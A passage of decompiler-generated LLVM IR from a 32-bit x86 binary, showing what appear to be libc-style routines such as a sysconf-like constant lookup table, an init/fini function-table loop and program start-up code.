dec_label_pc_8051857:                             ; preds = %dec_label_pc_805180f, %dec_label_pc_8051850
  %v0_805185a = phi i32 [ %v0_805185a.pre, %dec_label_pc_805180f ], [ %v5_8051850, %dec_label_pc_8051850 ]
  %v1_805185a = icmp eq i32 %v0_805185a, 0
  br i1 %v1_805185a, label %dec_label_pc_8051877, label %dec_label_pc_805185e

dec_label_pc_805185e:                             ; preds = %dec_label_pc_8051857
  %v4_805186e = load i32, i32* %stack_var_-24, align 4
  store i32 %v4_805186e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805187e

dec_label_pc_8051877:                             ; preds = %dec_label_pc_8051700, %dec_label_pc_8051857
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805187e

dec_label_pc_805187b:                             ; preds = %dec_label_pc_80517a0, %dec_label_pc_805175b, %dec_label_pc_805172d
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805187e

dec_label_pc_805187e:                             ; preds = %dec_label_pc_8051877, %dec_label_pc_805185e, %dec_label_pc_80517d2, %dec_label_pc_805187b
  %v0_8051888 = phi i32 [ 0, %dec_label_pc_8051877 ], [ %v4_805186e, %dec_label_pc_805185e ], [ %v0_8051888.pre, %dec_label_pc_80517d2 ], [ -1, %dec_label_pc_805187b ]
  store i32 %v0_8051703, i32* @ebx, align 4
  store i32 %v0_8051702, i32* @esi, align 4
  store i32 %v0_8051701, i32* @edi, align 4
  store i32 %v0_8051700, i32* @ebp, align 4
  ret i32 %v0_8051888

; uselistorder directives
  uselistorder i32 %storemerge3.pre-phi, { 1, 0 }
  uselistorder i32 %v1_805181a, { 1, 0, 2 }
  uselistorder i32 %v2_8051806, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_805179d, { 2, 1, 0 }
  uselistorder i32 %v4_805177c, { 1, 0, 2, 3 }
  uselistorder i32 %v2_805175c, { 0, 2, 4, 3, 1, 5 }
  uselistorder i32 %v2_8051743, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32 %v1_805172a, { 0, 3, 2, 1 }
  uselistorder i32* %stack_var_-460, { 0, 2, 3, 4, 5, 1, 6, 7, 8, 9, 10 }
  uselistorder i32* %stack_var_-24, { 2, 0, 4, 1, 5, 3 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 5, 6, 3, 4, 2 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 24, 25, 22, 23, 21 }
  uselistorder i32 (i32, i32*, i32)* @function_8051c4f, { 1, 2, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_805049e, { 2, 1, 0, 3, 4 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805187e, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8051877, { 1, 0 }
  uselistorder label %dec_label_pc_8051857, { 1, 0 }
  uselistorder label %dec_label_pc_8051850, { 1, 0 }
  uselistorder label %dec_label_pc_8051792.dec_label_pc_8051792_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_805171f.dec_label_pc_805171f_crit_edge, { 1, 0 }
}

define i32 @function_8051889(i32 %arg1) local_unnamed_addr {
dec_label_pc_8051889:
  switch i32 %arg1, label %dec_label_pc_80518a8 [
    i32 0, label %dec_label_pc_80518b8
    i32 1, label %dec_label_pc_805199d
    i32 2, label %dec_label_pc_80518c2
    i32 3, label %dec_label_pc_80518cc
    i32 4, label %dec_label_pc_80518d6
    i32 5, label %dec_label_pc_805196c
    i32 6, label %dec_label_pc_80518de
    i32 7, label %dec_label_pc_805189e
    i32 8, label %dec_label_pc_805189e
    i32 9, label %dec_label_pc_805189e
    i32 10, label %dec_label_pc_805189e
    i32 11, label %dec_label_pc_805189e
    i32 12, label %dec_label_pc_805189e
    i32 13, label %dec_label_pc_805189e
    i32 14, label %dec_label_pc_805189e
    i32 15, label %dec_label_pc_805189e
    i32 16, label %dec_label_pc_805189e
    i32 17, label %dec_label_pc_805189e
    i32 18, label %dec_label_pc_805189e
    i32 19, label %dec_label_pc_805189e
    i32 20, label %dec_label_pc_805189e
    i32 21, label %dec_label_pc_805189e
    i32 22, label %dec_label_pc_805189e
    i32 23, label %dec_label_pc_805199d
    i32 24, label %dec_label_pc_805199d
    i32 25, label %dec_label_pc_80519a9
    i32 26, label %dec_label_pc_805197a
    i32 27, label %dec_label_pc_805199d
    i32 28, label %dec_label_pc_80518f0
    i32 29, label %dec_label_pc_8051973
    i32 30, label %dec_label_pc_80518e8
    i32 31, label %dec_label_pc_8051988
    i32 32, label %dec_label_pc_805199d
    i32 33, label %dec_label_pc_805199d
    i32 34, label %dec_label_pc_805199d
    i32 35, label %dec_label_pc_8051981
    i32 36, label %dec_label_pc_80519b0
    i32 37, label %dec_label_pc_80519b7
    i32 38, label %dec_label_pc_80519b0
    i32 39, label %dec_label_pc_80518fa
    i32 40, label %dec_label_pc_80519be
    i32 41, label %dec_label_pc_805199d
    i32 42, label %dec_label_pc_8051988
    i32 43, label %dec_label_pc_80519b7
    i32 44, label %dec_label_pc_80519c5
    i32 45, label %dec_label_pc_80519b7
    i32 46, label %dec_label_pc_8051973
    i32 47, label %dec_label_pc_8051973
    i32 48, label %dec_label_pc_8051973
    i32 49, label %dec_label_pc_805199d
    i32 50, label %dec_label_pc_805199d
    i32 51, label %dec_label_pc_8051973
    i32 52, label %dec_label_pc_8051973
    i32 53, label %dec_label_pc_805199d
    i32 54, label %dec_label_pc_805199d
    i32 55, label %dec_label_pc_805199d
    i32 56, label %dec_label_pc_805199d
    i32 57, label %dec_label_pc_805199d
    i32 58, label %dec_label_pc_805199d
    i32 59, label %dec_label_pc_805199d
    i32 60, label %dec_label_pc_805199d
    i32 61, label %dec_label_pc_805199d
    i32 62, label %dec_label_pc_805199d
    i32 63, label %dec_label_pc_805199d
    i32 64, label %dec_label_pc_805199d
    i32 65, label %dec_label_pc_805199d
    i32 66, label %dec_label_pc_805199d
    i32 67, label %dec_label_pc_805189e
    i32 68, label %dec_label_pc_805189e
    i32 69, label %dec_label_pc_8051981
    i32 70, label %dec_label_pc_8051981
    i32 71, label %dec_label_pc_8051981
    i32 72, label %dec_label_pc_8051988
    i32 73, label %dec_label_pc_805198f
    i32 74, label %dec_label_pc_8051996
    i32 75, label %dec_label_pc_8051904
    i32 76, label %dec_label_pc_8051996
    i32 77, label %dec_label_pc_805189e
    i32 78, label %dec_label_pc_805189e
    i32 79, label %dec_label_pc_805189e
    i32 80, label %dec_label_pc_805189e
    i32 81, label %dec_label_pc_805189e
    i32 82, label %dec_label_pc_805189e
    i32 83, label %dec_label_pc_805189e
    i32 84, label %dec_label_pc_805189e
    i32 85, label %dec_label_pc_805199d
    i32 86, label %dec_label_pc_805199d
    i32 87, label %dec_label_pc_805197a
    i32 88, label %dec_label_pc_805190e
    i32 89, label %dec_label_pc_8051918
    i32 90, label %dec_label_pc_805198f
    i32 91, label %dec_label_pc_805189e
    i32 92, label %dec_label_pc_805189e
    i32 93, label %dec_label_pc_805189e
    i32 94, label %dec_label_pc_805189e
    i32 95, label %dec_label_pc_8051973
    i32 96, label %dec_label_pc_805199d
    i32 97, label %dec_label_pc_805199d
    i32 98, label %dec_label_pc_805189e
    i32 99, label %dec_label_pc_805189e
    i32 100, label %dec_label_pc_805189e
    i32 101, label %dec_label_pc_8051922
    i32 102, label %dec_label_pc_8051965
    i32 103, label %dec_label_pc_80519a2
    i32 104, label %dec_label_pc_805197a
    i32 105, label %dec_label_pc_805192c
    i32 106, label %dec_label_pc_8051988
    i32 107, label %dec_label_pc_8051988
    i32 108, label %dec_label_pc_805196c
    i32 109, label %dec_label_pc_80519a9
    i32 110, label %dec_label_pc_80519c5
    i32 111, label %dec_label_pc_8051965
    i32 112, label %dec_label_pc_80519a2
    i32 113, label %dec_label_pc_80519c5
    i32 114, label %dec_label_pc_8051936
    i32 115, label %dec_label_pc_80519be
    i32 116, label %dec_label_pc_805199d
    i32 117, label %dec_label_pc_805199d
    i32 118, label %dec_label_pc_8051940
    i32 119, label %dec_label_pc_805194a
    i32 120, label %dec_label_pc_80519b7
    i32 121, label %dec_label_pc_805197a
    i32 122, label %dec_label_pc_805197a
    i32 123, label %dec_label_pc_805197a
    i32 124, label %dec_label_pc_805197a
    i32 125, label %dec_label_pc_805189e
    i32 126, label %dec_label_pc_805189e
    i32 127, label %dec_label_pc_805199d
    i32 128, label %dec_label_pc_805199d
    i32 129, label %dec_label_pc_805189e
    i32 130, label %dec_label_pc_805189e
    i32 131, label %dec_label_pc_805199d
    i32 149, label %dec_label_pc_8051951
  ]

dec_label_pc_805189e:                             ; preds = %dec_label_pc_8051889, %dec_label_pc_8051889, %dec_label_pc_8051889, %dec_label_pc_8051889, %dec_label_pc_8051889, %dec_label_pc_8051889, %dec_label_pc_8051889, %dec_label_pc_8051889, %dec_label_pc_8051889, %dec_label_pc_8051889, %dec_label_pc_8051889, %dec_label_pc_8051889, %dec_label_pc_8051889, %dec_label_pc_8051889, %dec_label_pc_8051889, %dec_label_pc_8051889, %dec_label_pc_8051889, %dec_label_pc_8051889, %dec_label_pc_8051889, %dec_label_pc_8051889, %dec_label_pc_8051889, %dec_label_pc_8051889, %dec_label_pc_8051889, %dec_label_pc_8051889, %dec_label_pc_8051889, %dec_label_pc_8051889, %dec_label_pc_8051889, %dec_label_pc_8051889, %dec_label_pc_8051889, %dec_label_pc_8051889, %dec_label_pc_8051889, %dec_label_pc_8051889, %dec_label_pc_8051889, %dec_label_pc_8051889, %dec_label_pc_8051889, %dec_label_pc_8051889, %dec_label_pc_8051889
  br label %dec_label_pc_80519ca

dec_label_pc_80518a8:                             ; preds = %dec_label_pc_8051889
  %v1_80518a8 = call i32 @function_8050089(i32 ptrtoint (i32* @0 to i32))
  %v1_80518ad = inttoptr i32 %v1_80518a8 to i32*
  store i32 22, i32* %v1_80518ad, align 4
  br label %dec_label_pc_805199d

dec_label_pc_80518b8:                             ; preds = %dec_label_pc_8051889
  br label %dec_label_pc_80519ca

dec_label_pc_80518c2:                             ; preds = %dec_label_pc_8051889
  br label %dec_label_pc_80519ca

dec_label_pc_80518cc:                             ; preds = %dec_label_pc_8051889
  br label %dec_label_pc_80519ca

dec_label_pc_80518d6:                             ; preds = %dec_label_pc_8051889
  %v0_80518d9 = call i32 @function_8051fd5()
  br label %dec_label_pc_80518de

dec_label_pc_80518de:                             ; preds = %dec_label_pc_8051889, %dec_label_pc_80518d6
  br label %dec_label_pc_80519ca

dec_label_pc_80518e8:                             ; preds = %dec_label_pc_8051889
  %v0_80518eb = call i32 @function_805206c()
  br label %dec_label_pc_80518f0

dec_label_pc_80518f0:                             ; preds = %dec_label_pc_8051889, %dec_label_pc_80518e8
  br label %dec_label_pc_80519ca

dec_label_pc_80518fa:                             ; preds = %dec_label_pc_8051889
  br label %dec_label_pc_80519ca

dec_label_pc_8051904:                             ; preds = %dec_label_pc_8051889
  br label %dec_label_pc_80519ca

dec_label_pc_805190e:                             ; preds = %dec_label_pc_8051889
  br label %dec_label_pc_80519ca

dec_label_pc_8051918:                             ; preds = %dec_label_pc_8051889
  br label %dec_label_pc_80519ca

dec_label_pc_8051922:                             ; preds = %dec_label_pc_8051889
  br label %dec_label_pc_80519ca

dec_label_pc_805192c:                             ; preds = %dec_label_pc_8051889
  br label %dec_label_pc_80519ca

dec_label_pc_8051936:                             ; preds = %dec_label_pc_8051889
  br label %dec_label_pc_80519ca

dec_label_pc_8051940:                             ; preds = %dec_label_pc_8051889
  br label %dec_label_pc_80519ca

dec_label_pc_805194a:                             ; preds = %dec_label_pc_8051889
  br label %dec_label_pc_80519ca

dec_label_pc_8051951:                             ; preds = %dec_label_pc_8051889
  %v5_8051957 = call i32 @function_8051dd8(i32 1, %timespec* null, i32 149, i32 149)
  %v2_805195f = icmp slt i32 %v5_8051957, 0
  %v1_8051961 = icmp eq i1 %v2_805195f, false
  br i1 %v1_8051961, label %dec_label_pc_8051973, label %dec_label_pc_805199d

dec_label_pc_8051965:                             ; preds = %dec_label_pc_8051889, %dec_label_pc_8051889
  br label %dec_label_pc_80519ca

dec_label_pc_805196c:                             ; preds = %dec_label_pc_8051889, %dec_label_pc_8051889
  br label %dec_label_pc_80519ca

dec_label_pc_8051973:                             ; preds = %dec_label_pc_8051889, %dec_label_pc_8051889, %dec_label_pc_8051889, %dec_label_pc_8051889, %dec_label_pc_8051889, %dec_label_pc_8051889, %dec_label_pc_8051889, %dec_label_pc_8051951
  br label %dec_label_pc_80519ca

dec_label_pc_805197a:                             ; preds = %dec_label_pc_8051889, %dec_label_pc_8051889, %dec_label_pc_8051889, %dec_label_pc_8051889, %dec_label_pc_8051889, %dec_label_pc_8051889, %dec_label_pc_8051889
  br label %dec_label_pc_80519ca

dec_label_pc_8051981:                             ; preds = %dec_label_pc_8051889, %dec_label_pc_8051889, %dec_label_pc_8051889, %dec_label_pc_8051889
  br label %dec_label_pc_80519ca

dec_label_pc_8051988:                             ; preds = %dec_label_pc_8051889, %dec_label_pc_8051889, %dec_label_pc_8051889, %dec_label_pc_8051889, %dec_label_pc_8051889
  br label %dec_label_pc_80519ca

dec_label_pc_805198f:                             ; preds = %dec_label_pc_8051889, %dec_label_pc_8051889
  br label %dec_label_pc_80519ca

dec_label_pc_8051996:                             ; preds = %dec_label_pc_8051889, %dec_label_pc_8051889
  br label %dec_label_pc_80519ca

dec_label_pc_805199d:                             ; preds = %dec_label_pc_8051951, %dec_label_pc_8051889, %dec_label_pc_8051889, %dec_label_pc_8051889, %dec_label_pc_8051889, %dec_label_pc_8051889, %dec_label_pc_8051889, %dec_label_pc_8051889, %dec_label_pc_8051889, %dec_label_pc_8051889, %dec_label_pc_8051889, %dec_label_pc_8051889, %dec_label_pc_8051889, %dec_label_pc_8051889, %dec_label_pc_8051889, %dec_label_pc_8051889, %dec_label_pc_8051889, %dec_label_pc_8051889, %dec_label_pc_8051889, %dec_label_pc_8051889, %dec_label_pc_8051889, %dec_label_pc_8051889, %dec_label_pc_8051889, %dec_label_pc_8051889, %dec_label_pc_8051889, %dec_label_pc_8051889, %dec_label_pc_8051889, %dec_label_pc_8051889, %dec_label_pc_8051889, %dec_label_pc_8051889, %dec_label_pc_8051889, %dec_label_pc_8051889, %dec_label_pc_8051889, %dec_label_pc_8051889, %dec_label_pc_80518a8
  br label %dec_label_pc_80519ca

dec_label_pc_80519a2:                             ; preds = %dec_label_pc_8051889, %dec_label_pc_8051889
  br label %dec_label_pc_80519ca

dec_label_pc_80519a9:                             ; preds = %dec_label_pc_8051889, %dec_label_pc_8051889
  br label %dec_label_pc_80519ca

dec_label_pc_80519b0:                             ; preds = %dec_label_pc_8051889, %dec_label_pc_8051889
  br label %dec_label_pc_80519ca

dec_label_pc_80519b7:                             ; preds = %dec_label_pc_8051889, %dec_label_pc_8051889, %dec_label_pc_8051889, %dec_label_pc_8051889
  br label %dec_label_pc_80519ca

dec_label_pc_80519be:                             ; preds = %dec_label_pc_8051889, %dec_label_pc_8051889
  br label %dec_label_pc_80519ca

dec_label_pc_80519c5:                             ; preds = %dec_label_pc_8051889, %dec_label_pc_8051889, %dec_label_pc_8051889
  br label %dec_label_pc_80519ca

dec_label_pc_80519ca:                             ; preds = %dec_label_pc_80519be, %dec_label_pc_80519b7, %dec_label_pc_80519b0, %dec_label_pc_80519a9, %dec_label_pc_80519a2, %dec_label_pc_8051996, %dec_label_pc_805198f, %dec_label_pc_8051988, %dec_label_pc_8051981, %dec_label_pc_805197a, %dec_label_pc_805196c, %dec_label_pc_8051965, %dec_label_pc_8051973, %dec_label_pc_805194a, %dec_label_pc_8051940, %dec_label_pc_8051936, %dec_label_pc_805192c, %dec_label_pc_8051922, %dec_label_pc_8051918, %dec_label_pc_805190e, %dec_label_pc_8051904, %dec_label_pc_80518fa, %dec_label_pc_80518f0, %dec_label_pc_80518de, %dec_label_pc_80518cc, %dec_label_pc_80518c2, %dec_label_pc_80518b8, %dec_label_pc_805189e, %dec_label_pc_805199d, %dec_label_pc_80519c5
  %v0_80519cd = phi i32 [ 255, %dec_label_pc_80519be ], [ 2048, %dec_label_pc_80519b7 ], [ 99, %dec_label_pc_80519b0 ], [ 20, %dec_label_pc_80519a9 ], [ -128, %dec_label_pc_80519a2 ], [ 1024, %dec_label_pc_8051996 ], [ 4, %dec_label_pc_805198f ], [ 32, %dec_label_pc_8051988 ], [ 256, %dec_label_pc_8051981 ], [ 2147483647, %dec_label_pc_805197a ], [ 16, %dec_label_pc_805196c ], [ 127, %dec_label_pc_8051965 ], [ 200112, %dec_label_pc_8051973 ], [ 9, %dec_label_pc_805194a ], [ 65535, %dec_label_pc_8051940 ], [ -32768, %dec_label_pc_8051936 ], [ -2147483648, %dec_label_pc_805192c ], [ 8, %dec_label_pc_8051922 ], [ 500, %dec_label_pc_8051918 ], [ 4096, %dec_label_pc_805190e ], [ 16384, %dec_label_pc_8051904 ], [ 1000, %dec_label_pc_80518fa ], [ 32768, %dec_label_pc_80518f0 ], [ 6, %dec_label_pc_80518de ], [ 65536, %dec_label_pc_80518cc ], [ 100, %dec_label_pc_80518c2 ], [ 131072, %dec_label_pc_80518b8 ], [ 1, %dec_label_pc_805189e ], [ -1, %dec_label_pc_805199d ], [ 32767, %dec_label_pc_80519c5 ]
  ret i32 %v0_80519cd

; uselistorder directives
  uselistorder i32 65536, { 10, 11, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 -2147483648, { 0, 2, 1 }
  uselistorder i32 65535, { 1, 0, 2 }
  uselistorder i32 1024, { 2, 0, 3, 1, 4 }
  uselistorder i32 2048, { 4, 5, 1, 0, 2, 3 }
  uselistorder i32 255, { 1, 2, 3, 5, 6, 7, 8, 4, 0 }
  uselistorder i32 149, { 1, 0, 2 }
  uselistorder i32 131, { 4, 0, 1, 3, 2 }
  uselistorder i32 127, { 0, 2, 1 }
  uselistorder i32 124, { 4, 5, 3, 0, 1, 6, 2 }
  uselistorder i32 117, { 2, 0, 1 }
  uselistorder i32 116, { 1, 2, 0 }
  uselistorder i32 112, { 2, 0, 3, 4, 1, 5, 6, 7 }
  uselistorder i32 111, { 4, 0, 2, 1, 3 }
  uselistorder i32 110, { 4, 0, 2, 1, 3 }
  uselistorder i32 108, { 20, 21, 22, 17, 23, 11, 2, 15, 0, 1, 24, 12, 13, 18, 19, 25, 26, 14, 27, 3, 4, 5, 28, 29, 6, 30, 7, 8, 9, 10, 16, 31 }
  uselistorder i32 104, { 2, 3, 1, 5, 4, 0 }
  uselistorder i32 99, { 1, 2, 0 }
  uselistorder i32 96, { 1, 2, 3, 0, 4 }
  uselistorder i32 95, { 3, 1, 0, 2 }
  uselistorder i32 92, { 11, 1, 0, 4, 2, 3, 6, 12, 13, 9, 10, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 8, 25, 26, 27, 5, 28, 29, 7, 34, 31, 32, 33, 30, 35 }
  uselistorder i32 87, { 2, 0, 1 }
  uselistorder i32 83, { 2, 0, 1 }
  uselistorder i32 80, { 1, 2, 0 }
  uselistorder i32 76, { 3, 4, 1, 5, 0, 6, 2 }
  uselistorder i32 68, { 4, 0, 1, 2, 3 }
  uselistorder i32 60, { 3, 0, 1, 2 }
  uselistorder i32 55, { 2, 0, 1, 3 }
  uselistorder i32 54, { 1, 0 }
  uselistorder i32 46, { 1, 2, 0 }
  uselistorder i32 43, { 7, 0, 3, 1, 4, 2, 5, 8, 6 }
  uselistorder i32 42, { 1, 2, 0 }
  uselistorder i32 41, { 1, 2, 3, 0 }
  uselistorder i32 39, { 1, 2, 3, 0 }
  uselistorder i32 38, { 2, 0, 3, 4, 1 }
  uselistorder i32 37, { 2, 0, 3, 4, 1 }
  uselistorder i32 34, { 3, 4, 5, 2, 0, 1, 6, 7, 8 }
  uselistorder i32 33, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32 29, { 2, 0, 1 }
  uselistorder i32 25, { 2, 0, 1 }
  uselistorder i32 23, { 2, 0, 1 }
  uselistorder i32 21, { 3, 1, 2, 0 }
  uselistorder i32 17, { 8, 5, 7, 2, 3, 1, 0, 4, 6, 9, 10 }
  uselistorder i32 13, { 3, 0, 1, 2, 4, 5, 6, 7 }
  uselistorder i32 9, { 3, 11, 0, 1, 7, 12, 6, 4, 8, 5, 9, 13, 14, 15, 16, 17, 18, 19, 10, 2 }
  uselistorder i32 6, { 0, 14, 4, 5, 1, 26, 6, 2, 7, 15, 16, 17, 18, 19, 20, 21, 11, 8, 12, 13, 22, 23, 24, 25, 9, 3, 10 }
  uselistorder i32 5, { 11, 1, 13, 14, 5, 4, 6, 2, 3, 12, 0, 7, 8, 10, 9 }
  uselistorder label %dec_label_pc_80519ca, { 29, 0, 1, 2, 3, 4, 28, 5, 6, 7, 8, 9, 12, 10, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder label %dec_label_pc_805199d, { 0, 34, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder label %dec_label_pc_8051973, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_80518f0, { 1, 0 }
  uselistorder label %dec_label_pc_80518de, { 1, 0 }
}

define i32 @function_80519ce() local_unnamed_addr {
dec_label_pc_80519ce:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80519ce = load i32, i32* @ebx, align 4
  store i32 %v0_80519ce, i32* %stack_var_-4, align 4
  store i32 add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8053000.215 to i32), i32 -134557696), i32 2), i32 -1), i32* %ebx.global-to-local, align 4
  br i1 icmp ne (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8053000.215 to i32), i32 -134557696), i32 2), i32 0), label %dec_label_pc_80519e2, label %dec_label_pc_80519ef

dec_label_pc_80519e2:                             ; preds = %dec_label_pc_80519ce, %dec_label_pc_80519e2
  %v1_80519e98 = phi i32 [ %v1_80519e9, %dec_label_pc_80519e2 ], [ add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8053000.215 to i32), i32 -134557696), i32 2), i32 -1), %dec_label_pc_80519ce ]
  store i32 ptrtoint (i32* @global_var_80519e9.216 to i32), i32* %stack_var_-16, align 4
  %v5_80519e2 = mul i32 %v1_80519e98, 4
  %v6_80519e2 = add i32 %v5_80519e2, ptrtoint (i32* @global_var_8053000.215 to i32)
  %v7_80519e2 = inttoptr i32 %v6_80519e2 to i32*
  %v8_80519e2 = load i32, i32* %v7_80519e2, align 4
  call void @__pseudo_call(i32 %v8_80519e2)
  %v0_80519e9.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_80519e9 = add i32 %v0_80519e9.pre, -1
  store i32 %v1_80519e9, i32* %ebx.global-to-local, align 4
  %v10_80519ea = icmp eq i32 %v0_80519e9.pre, 0
  %v1_80519ed = icmp eq i1 %v10_80519ea, false
  br i1 %v1_80519ed, label %dec_label_pc_80519e2, label %dec_label_pc_80519ef

dec_label_pc_80519ef:                             ; preds = %dec_label_pc_80519e2, %dec_label_pc_80519ce
  %v0_80519ef = load i32, i32* @global_var_80530f0.217, align 16
  %v1_80519f4 = icmp eq i32 %v0_80519ef, 0
  br i1 %v1_80519f4, label %dec_label_pc_80519fa, label %dec_label_pc_80519f8

dec_label_pc_80519f8:                             ; preds = %dec_label_pc_80519ef
  %v0_80519f8 = load i32, i32* %stack_var_-16, align 4
  %v1_80519f8 = call i32 @unknown_0(i32 %v0_80519f8)
  br label %dec_label_pc_80519fa

dec_label_pc_80519fa:                             ; preds = %dec_label_pc_80519f8, %dec_label_pc_80519ef
  %v0_80519fa = load i32, i32* @global_var_80530f4.218, align 4
  store i32 %v0_80519fa, i32* @ecx, align 4
  %v1_8051a00 = icmp eq i32 %v0_80519fa, 0
  br i1 %v1_8051a00, label %dec_label_pc_8051a09, label %dec_label_pc_8051a04

dec_label_pc_8051a04:                             ; preds = %dec_label_pc_80519fa
  %v2_8051a04 = load i32, i32* %stack_var_-16, align 4
  %v1_8051a07 = call i32 @unknown_0(i32 %v2_8051a04)
  br label %dec_label_pc_8051a09

dec_label_pc_8051a09:                             ; preds = %dec_label_pc_8051a04, %dec_label_pc_80519fa
  %v2_8051a09 = load i32, i32* %stack_var_-4, align 4
  ret i32 %v2_8051a09

; uselistorder directives
  uselistorder i32 %v1_80519e9, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32 (i32)* @unknown_0, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_80519e2, { 1, 0 }
}

define i32 @function_8051a0d(i32 %arg1) local_unnamed_addr {
dec_label_pc_8051a0d:
  ret i32 0
}

define i32 @function_8051a10(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8051a10:
  %v0_8051a10 = load i32, i32* @eax, align 4
  ret i32 %v0_8051a10
}

define i32 @function_8051a11() local_unnamed_addr {
dec_label_pc_8051a11:
  %stack_var_-12 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %v0_8051a11 = load i32, i32* @esi, align 4
  %v0_8051a12 = load i32, i32* @ebx, align 4
  %v0_8051a16 = load i32, i32* @eax, align 4
  store i32 %v0_8051a16, i32* @esi, align 4
  %v0_8051a18 = load i32, i32* @edx, align 4
  store i32 %v0_8051a18, i32* @ebx, align 4
  %v4_8051a1d = call i32 @function_804fa8d(i32 %v0_8051a16, i32 1, i32 %tmp6)
  %v8_8051a25 = icmp eq i32 %v4_8051a1d, -1
  %v1_8051a26 = icmp eq i1 %v8_8051a25, false
  br i1 %v1_8051a26, label %dec_label_pc_8051a41, label %dec_label_pc_8051a28

dec_label_pc_8051a28:                             ; preds = %dec_label_pc_8051a11
  %v0_8051a2a = load i32, i32* @ebx, align 4
  %v6_8051a30 = call i32 @function_804fc62(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8052cac.219, i32 0, i32 0), i32 %v0_8051a2a)
  %v1_8051a38 = load i32, i32* @esi, align 4
  %v12_8051a38 = icmp eq i32 %v6_8051a30, %v1_8051a38
  br i1 %v12_8051a38, label %dec_label_pc_8051a41, label %dec_label_pc_8051a3c

dec_label_pc_8051a3c:                             ; preds = %dec_label_pc_8051a28
  %v0_8051a3c = call i32 @function_8051445()
  br label %dec_label_pc_8051a41

dec_label_pc_8051a41:                             ; preds = %dec_label_pc_8051a28, %dec_label_pc_8051a11, %dec_label_pc_8051a3c
  %v2_8051a41 = load i32, i32* %stack_var_-12, align 4
  store i32 %v0_8051a12, i32* @ebx, align 4
  store i32 %v0_8051a11, i32* @esi, align 4
  ret i32 %v2_8051a41

; uselistorder directives
  uselistorder i32 ()* @function_8051445, { 3, 2, 1, 4, 0 }
  uselistorder i32 (i8*, i32)* @function_804fc62, { 4, 5, 0, 1, 2, 3 }
  uselistorder i32 (i32, i32, i32)* @function_804fa8d, { 2, 3, 7, 6, 5, 4, 1, 0 }
  uselistorder label %dec_label_pc_8051a41, { 2, 0, 1 }
}

define i32 @function_8051a45() local_unnamed_addr {
dec_label_pc_8051a45:
  %v0_8051a48 = load i8, i8* @global_var_80530f8.220, align 8
  %v1_8051a48 = icmp eq i8 %v0_8051a48, 0
  %v1_8051a4f = icmp eq i1 %v1_8051a48, false
  br i1 %v1_8051a4f, label %dec_label_pc_8051a45.dec_label_pc_8051a81_crit_edge, label %dec_label_pc_8051a51

dec_label_pc_8051a45.dec_label_pc_8051a81_crit_edge: ; preds = %dec_label_pc_8051a45
  %v0_8051a84.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8051a81

dec_label_pc_8051a51:                             ; preds = %dec_label_pc_8051a45
  store i8 1, i8* @global_var_80530f8.220, align 8
  store i32 4096, i32* @global_var_80530ec.221, align 4
  br label %dec_label_pc_8051a81

dec_label_pc_8051a81:                             ; preds = %dec_label_pc_8051a45.dec_label_pc_8051a81_crit_edge, %dec_label_pc_8051a51
  %v0_8051a84 = phi i32 [ %v0_8051a84.pre, %dec_label_pc_8051a45.dec_label_pc_8051a81_crit_edge ], [ 0, %dec_label_pc_8051a51 ]
  ret i32 %v0_8051a84

; uselistorder directives
  uselistorder i8 1, { 6, 1, 7, 3, 0, 8, 9, 10, 11, 2, 5, 4 }
  uselistorder i8* @global_var_80530f8.220, { 1, 0 }
  uselistorder label %dec_label_pc_8051a81, { 1, 0 }
}

define i32 @function_8051a85(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_8051a85:
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %tmp38 = call i32 @__decompiler_undefined_function_0()
  %tmp39 = call i32 @__decompiler_undefined_function_0()
  %tmp44 = ptrtoint i32* %arg3 to i32
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-164 = alloca i32, align 4
  %v0_8051a86 = load i32, i32* @edi, align 4
  store i32 %tmp44, i32* @edi, align 4
  store i32 %arg7, i32* @global_var_80530e4.222, align 4
  store i32 %arg6, i32* @global_var_80530f4.218, align 4
  store i32 %arg4, i32* @ebp, align 4
  %v2_8051abc = mul i32 %arg2, 4
  %v3_8051abc = add i32 %tmp44, %v2_8051abc
  %v1_8051abf = add i32 %v3_8051abc, 4
  store i32 %v1_8051abf, i32* @global_var_80530e8.223, align 8
